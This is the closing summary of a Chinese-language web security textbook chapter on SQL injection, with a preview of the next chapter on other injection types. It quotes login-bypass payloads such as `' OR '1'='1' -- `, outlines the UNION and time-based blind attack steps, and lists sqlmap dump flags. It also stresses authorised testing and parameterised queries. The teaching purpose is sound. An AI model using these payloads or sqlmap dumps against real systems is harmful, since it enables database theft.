> **一句話定位**:WAF 是「城牆外多一道拒馬」,參數化查詢才是「把城門本身焊死」。拒馬能擋住一波波散兵,但真正讓城攻不破的,是那道焊死的門。**只裝拒馬、城門大開,遲早破城。** 防 SQLi,程式碼層的參數化查詢永遠是第一優先,WAF 只是加分。

## 7.11 本章小結

- **SQLi 是「漏洞之王」**:歷史悠久、危害極大(可 dump 全庫、甚至 RCE)、至今仍常見,是 OWASP A03 注入(第 06 章)的頭號代表。
- **本質是「資料被當成程式碼執行」**:當使用者輸入能改變 SQL 的**語法結構**(而非只填充資料值),資料與程式碼的界線就破了。經典的 `' OR '1'='1' -- ` 與 `admin' -- ` 就是登入繞過的原型(呼應第 00 章信任邊界、第 06 章邊界②)。
- **找注入點**:URL 參數、表單、Cookie、Header、API 參數都可能是入口;用單引號 `'` 當探針,看報錯或行為變化。
- **三大類型**:In-band(Error / Union,當面給答案)、Blind(Boolean / Time,問是非題或看時間差)、Out-of-band(叫 DB 打電話回報)。頻寬越窄越慢,但只要有洞就守不住。
- **Union 實戰六步**:數欄位(`ORDER BY` / `UNION SELECT NULL`)→ 找回顯位置 → 指紋 → 用 `information_schema` 列表列欄 → dump 帳密。
- **Blind 實戰**:Boolean-based 靠頁面真 / 假反應一位一位問;Time-based 靠 `SLEEP()` 的延遲判斷——**看不到回應也能偷資料**。
- **sqlmap**:自動化神器(`-u`、`--data`、`--dbs`、`--dump`、`--batch`、`-r`),最實用是餵 Burp 存的 request 檔;但**務必先懂原理再用工具**,且只對授權目標開火(第 00 章)。
- **根治防禦:參數化查詢(Prepared Statements)**——把 SQL 骨架與資料分開送,資料永遠只是資料。再疊上 ORM、最小權限 DB 帳號、白名單、關閉詳細錯誤;WAF 是輔助補牆,不是根治。

> **下一章預告**:SQLi 只是注入家族的長子。第 08 章我們把「資料被當成程式碼執行」這個核心心智模型,套用到**其他注入**上——**命令注入(Command Injection)**讓你的輸入變成作業系統指令、**XXE** 用 XML 的外部實體讀檔與打內網、**SSTI(伺服器端模板注入)**讓模板引擎替你執行程式碼、以及 **NoSQL 注入**證明「換成 MongoDB 也一樣會中」。你會發現:招式雖然換了皮,骨子裡都是同一句話——**別把不可信的資料,交給任何一個「會解讀語法」的引擎去執行。** 本章的參數化思維,下一章會一再變形重演。
